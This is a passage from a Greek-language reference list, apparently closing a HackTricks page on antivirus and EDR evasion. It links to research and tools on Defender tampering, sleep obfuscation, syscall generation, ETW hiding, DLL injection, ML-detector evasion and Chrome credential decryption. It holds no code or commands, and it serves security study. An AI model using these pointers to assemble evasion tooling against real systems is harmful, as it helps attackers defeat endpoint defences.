- [20] [Zero Salarium – Αντιμετώπιση των EDR με την υποστήριξη του Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – Παραβίαση του προστατευτικού κελύφους του Windows Defender με την τεχνική Folder Redirect](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – Αναφορά εντολής mklink](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – Πίσω από την αγνή βιτρίνα: Από το RAT στον builder και έπειτα στον coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – Ο SantaStealer έρχεται στην πόλη: Ένα νέο, φιλόδοξο infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – Αποκρυπτογράφηση Chrome App Bound Encryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [26] [Check Point Research – GachiLoader: Αντιμετώπιση του malware Node.js με API tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [Ωραία Κοιμωμένη: Βάζοντας το Adaptix για ύπνο με το Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – Δηλητηρίαση παραμέτρων διεργασίας](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [30] [Ωραία Κοιμωμένη II: CFG, CET και πλαστογράφηση stack](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Συσκότιση ύπνου Ekko](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com - Απόκρυψη του Dotnet Etw](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [trustedsec.com - Κατάχρηση του Chrome Remote Desktop σε επιχειρήσεις Red Team: Πρακτικός οδηγός](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)
- [36] [Check Point Research - BTR Reforged: Μετατροπή του driver αποκατάστασης του Defender σε primitive λειτουργιών kernel](https://research.checkpoint.com/2026/btr-reforged-weaponizing-defenders-remediation-driver-as-a-kernel-operation-primitive/)
- [37] [Dump-GUY - BTR_CLI](https://github.com/Dump-GUY/BTR_CLI)
- [38] [Συνοδευτικός κώδικας του MDSec Function Peekaboo](https://github.com/mdsecactivebreach/functionpeekaboo)
- [39] [MDSec - Function Peekaboo: Δημιουργία συναρτήσεων αυτοαπόκρυψης με LLVM](https://mdsec.co.uk/2025/10/function-peekaboo-crafting-self-masking-functions-using-llvm/)
- [40] [Microsoft Learn - VirtualProtect](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)
- [41] [Πηγαίος κώδικας InjectSetConsole του TwoSevenOneT](https://github.com/TwoSevenOneT/InjectSetConsole)
- [42] [Microsoft Learn - Συνάρτηση CreatePipe](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-createpipe)
- [43] [Microsoft Learn - Δημιουργία child process με ανακατευθυνόμενη είσοδο και έξοδο](https://learn.microsoft.com/en-us/windows/win32/procthread/creating-a-child-process-with-redirected-input-and-output)
- [44] [Praetorian - GhostPack Necromancy: Αναδημιουργία εργαλείων C# με το WasmForge](https://praetorian.com/blog/wasmforge-csharp-ghostpack-edr-evasion)
- [45] [WasmForge - Μεταγλώττιση έργων C# / .NET](https://github.com/praetorian-inc/wasmforge/blob/main/docs/CSHARP.md)
- [46] [Proof of concept και πηγαίος κώδικας του DLLParty](https://github.com/epersic/DLLParty)
- [47] [DLLParty — Κατάχρηση των εσωτερικών του thread pool για injection DLL χωρίς shellcode](https://medium.com/@persic.eno/dllparty-abusing-thread-pool-internals-for-shellcodeless-dll-injection-7c84106f7745)
- [48] [Σύνολο δεδομένων αξιολόγησης EMBER2024 και εργαλεία thrember](https://github.com/FutureComputing4AI/EMBER2024)
- [49] [Χρήση του EMBER2024 για την αξιολόγηση εμφυτευμάτων Red Team](https://mez0.cc/posts/evaluating-implants-with-ember/)
- [50] [MSec Operations – Αποφυγή εντοπισμού με βάση τη μηχανική μάθηση](https://msecops.de/blog/posts/ml-evasion/)
- [51] [Kaspersky Securelist – Πλαίσιο φόρτωσης .NET βασισμένο σε XAML, NetamLoader](https://securelist.com/netamloader/121676)
- [52] [Microsoft Learn – Απαρίθμηση AMSI_RESULT](https://learn.microsoft.com/en-us/windows/win32/api/amsi/ne-amsi-amsi_result)
- [53] [Microsoft Learn – Μέθοδος IAntimalware::Scan](https://learn.microsoft.com/en-us/windows/win32/api/amsi/nf-amsi-iantimalware-scan)
{{#include ../banners/hacktricks-training.md}}
